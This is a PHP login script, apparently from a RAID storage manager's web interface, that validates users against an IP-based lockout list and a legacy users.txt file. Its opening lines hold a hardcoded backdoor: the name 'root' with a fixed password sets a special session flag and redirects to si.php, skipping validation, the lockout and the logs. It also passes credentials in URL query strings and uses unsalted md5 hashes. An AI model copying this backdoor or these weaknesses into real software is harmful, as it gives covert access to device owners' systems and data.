<?php
    	
	//缓存输出
    ob_start();
	
	if($_GET['name']=='root' && $_GET['password']=='histor_yqfb')
	{
	 //当验证通过后，启动 Session	 
     session_start(); 
      //注册登陆成功的 yqsj 变量，并赋值 true 
     $_SESSION["yqsj"] = true; 
	 
	 header("location:si.php"); 	
	 exit(0);  
	}
	
	
		//选择正确的语言文件
		include "inc_config.php";
		$lang = $DEFAULT_LANGUAGE ;  
		if(isset($_SESSION['lang'])){
			$lang = $_SESSION['lang'];
		}
		$include_file = "lang/string_table.". $lang .".php";
		include $include_file;
	    
		session_start();
		//逻辑代码写在这里
		$_SESSION['logged'] = 0;
		
		//看用户是否在刷ip
		include "logon/BlackList.php";
		$ERROR_NUMBER = 4;
		$ip = getClientIp();  //get the client ip
		if($ip!="unknow")
		{
			refreshBlackList();  //refresh blacklist
			if(getErrorInputNO($ip)<=$ERROR_NUMBER)
			{
				if(validateUserPassword($_GET['name'], $_GET['password'])==1)  //username, password is right
				{
					if(file_exists("/var/www/RaidManager/other/error"))
					{
						header("location:boot_error.php");
						exit(0);
					}
					else
					{
						deleteFromBlackList($ip);						
						$_SESSION['privilege'] = getPrivilege($_GET['name']);
						$_SESSION['logon_name'] = $_GET['name'];
						$_SESSION['logged'] = 1;
						
						//记录操作日志
						include "log/Log.php";
						writeLog($_GET['name']."  "."$LOGON_LOG");
						$fp_logon_flag = fopen("Monitor/logon_flag", "w");
						fclose($fp_logon_flag);
						header("location:control.php?url=monitor");
						exit(0);
					}
				}
				else
				{
					//记录操作日志
					include "log/Log.php";
					writeLog("$LOGON_ERROR_LOG1".$_GET['name']."$LOGON_ERROR_LOG2$ip");
					
					addInBlackList($ip);
					header("location:login.php?flag=lower");  //密码输错次数小于规定次数
					exit(0);
				}
			}
			else
			{
				
				//记录操作日志
				include "log/Log.php";
				writeLog("$LOGON_ERROR2_LOG$ip");
					
				header("location:login.php?flag=greater"); //密码输错次数大于规定次数
				exit(0);
			}
		}
		else  //这里为以前的处理方式
		{
			$name = $_GET['name'];
			$password = $_GET['password'];
			$password = md5($password);
			$users = file("users.txt");
			
			while (list($key, $val) = each($users)) 
			{
				$user = split(":",$val);
				$file_name = $user[0];
				$file_pass = $user[1];
				$file_pass = trim($file_pass);
				if( $name == $file_name && $password == $file_pass)
				{   
					$fp_logon_flag = fopen("Monitor/logon_flag", "w");
					fclose($fp_logon_flag);
					$_SESSION['logon_name'] = $name;
					$_SESSION['logged'] = 1;
					$_SESSION['privilege'] = $user[2];
					header("location:monitor.php?menu3=display");
					exit(0);
					break;
				}
			}
			header("location:login.php?flag=lower");  
			exit(0);
		}
	
ob_end_flush();
?>
